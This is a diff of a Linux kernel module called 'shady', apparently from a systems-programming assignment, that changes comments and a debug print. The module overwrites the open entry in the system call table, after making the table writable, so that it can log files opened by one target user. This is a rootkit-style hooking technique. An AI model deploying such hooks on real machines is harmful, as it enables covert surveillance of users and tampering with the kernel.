@@ -66,7 +66,7 @@ asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
    /* YOUR CODE HERE */
-   printk("This is my uid %d\n", get_current_user()->uid.val);
+   //printk("This is my uid %d\n", get_current_user()->uid.val);
    if(get_current_user()->uid.val == marks_uid)
    	printk("%s is opening file %s\n",name,file);
    return old_open(file, flags, mode);
@@ -211,7 +211,7 @@ static void
 shady_cleanup_module(int devices_to_destroy)
 {
   int i;
-  //set open to old open when module is unloaded 
+  //setting the open to the old one
   ((unsigned long **)system_call_table_address)[__NR_open] = old_open;
 
   /* Get rid of character devices (if any exist) */
@@ -282,12 +282,12 @@ shady_init_module(void)
     }
   }
 
-/* Save current value of open system call int old open and replace with my_open */
+  //geting the old_open and setting it to open link
   old_open = ((unsigned long **) system_call_table_address)[__NR_open];
   
-  /*  Modify the sytem call table to RW */
+  //change call table to rw privelegies
   set_addr_rw(system_call_table_address);
-  
+  //adding my open to table now i can intercept all the open calls
   ((unsigned long **) system_call_table_address)[__NR_open] = my_open;
   
   return 0; /* success */
